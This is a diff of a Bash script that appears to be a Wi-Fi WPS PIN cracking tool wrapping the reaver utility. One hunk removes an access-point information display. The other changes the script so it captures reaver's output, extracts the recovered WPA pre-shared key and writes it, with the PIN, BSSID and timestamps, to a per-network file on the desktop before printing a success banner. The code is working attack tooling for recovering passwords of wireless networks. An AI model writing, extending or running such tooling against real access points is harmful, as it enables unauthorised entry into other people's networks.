@@ -273,42 +273,13 @@ arguments() {
 											   v=0
 									 fi
 						   done
-						   sleep 0.2
+						   
 						   echo ""
 						   echo ""
-						   if [ "$BI" -eq "0" ]
-						   		then
-						   			echo -e "${White} +${Yellow}-------------------------------------------${White}+"
-						   			echo -e "${Yellow} |${White} [${Red}+${White}]${Yellow} Information about Access Point (AP)   |"
-						   			echo -e "${White} +${Yellow}-------------------------------------------${White}+"
-						   			echo ""
-						   			echo -e "$White [+] ESSID: $Green$ESSID"
-				           			sleep 0.2
-                           			echo -e "$White [+] BSSID: $Green$BSSID "
-						   			sleep 0.2
-                           			echo -e "$White [+] Channel: $Green$CHANNEL "
-						   			sleep 0.2
-						   			if [ "$menu" -ne 1 ]
-						      			then
-						          			echo -e "$White [+] Encryption:$Green $PRIVACY"
-						          			sleep 0.2
-						          			echo -e "$White [+] Speed:$Green$SPEED"
-						   			fi
-						   			Manufacturer=`cat ${Temporary}/Reaver.txt | grep Manufacturer: | cut -d' ' -f2- | sed  -n 1p 2> /dev/null`
-						   			Model_Name=`cat ${Temporary}/Reaver.txt | grep Name: | cut -d' ' -f2- | sed -n 1p 2> /dev/null`
-						   			Model_Number=`cat ${Temporary}/Reaver.txt | grep 'Model Number:' | cut -d' ' -f2- | sed -n 1p 2> /dev/null`
-						   			Serial_Number=`cat ${Temporary}/Reaver.txt | grep 'Serial Number:' | cut -d' ' -f2- | sed -n 1p 2> /dev/null`
-						   			echo -e "$White [+] $Manufacturer"
-						   			sleep 0.2
-						   			echo -e "$White [+] $Model_Name"
-						   			sleep 0.2
-						   			echo -e "$White [+] $Model_Number"
-						   			sleep 0.2
-						   			echo -e "$White [+] $Serial_Number"
-						   			sleep 0.2
-                           			echo ""
-						   			sleep 0.2
-						   fi
+						
+						   		
+						   			
+						  
 						   kill -9 $ReaverID 2> /dev/null
 }
 GENERATE_DEFAULT_PIN() {
@@ -1665,27 +1636,29 @@ CRACKING_PROCESS() {
 										                             echo -e "$White [+] Running$Green Reaver$White with the correct$Green PIN$White, wait ..."
 											                         echo ""
 										                             echo -e -n "$BYellow"
-										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
+										                             reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4 | tee  ${Temporary}/Get_PIN.txt
 										                             PID="$!"
 										                             Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
 										                             End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
-										                             Loading
-										                             
-																 else
-																     echo ""
-																	 echo -e "$White [+] Running$Green reaver$White with the correct$Green PIN$White, wait ..."
-																	 echo ""
-																	 echo -e -n "$BYellow"
-																	 reaver -i $mon -b $BSSID -c $CHANNEL -e "$ESSID" -vv -n -p $PIN -T 4
-																	 PID="$!"
-																	 Wait_Msg="Wait until the${Green} Reaver${white} is${Red} finished${White} ."
-																	 End_Msg="The process of${Green} Reaver${White} has completed${Green} successfully${White}."
-																	 Loading
-																	
+										                            Loading
+																	 Key=`grep -w "WPA PSK" ${Temporary}/Get_PIN.txt | awk -F\' '{print $2}'`
+																	 echo " [+] Key        >> \"$Key\"" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
 															fi
 															if [ "$ByPASS_Result" -eq "0" ]
 																then
-																	
+																	echo " [+] Time Taken >> $time_taken" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+																	echo " [+] Date       >> $cr_date" >> ${Desktop_PATH}/HT-WPS-PIN/${BSSID}.txt
+																	echo ""
+																	echo -e "${White} [+]${Yellow} ESSID      ${Red}>>${Cyan} $ESSID" 
+									                        		echo -e "${White} [+]${Yellow} BSSID      ${Red}>>${Cyan} $BSSID"
+									                        		echo -e "${White} [+]${Yellow} Channel    ${Red}>>${White} $CHANNEL"
+									                        		echo -e "${White} [+]${Yellow} PIN        ${Red}>>${White} \"${Green}$PIN${White}\""
+									                        		echo -e "${White} [+]${Yellow} Key        ${Red}>>${White} \"${Green}$Key${White}\""
+									                        		if [ "$HHDP" -eq "0" ]
+									                        			then
+									                        				echo -e "${White} [+]${Yellow} Time Taken ${Red}>>${White} $time_taken"
+									                        		fi
+																	echo -e "${White} [+]${Yellow} Date       ${Red}>>${White} $cr_date"
 																	echo ""
 									                        		echo -e "$White [${Yellow}+${White}]$Green Congratulation ${White}(${Red}^${White}_${Red}^${White})"
 													        		echo ""
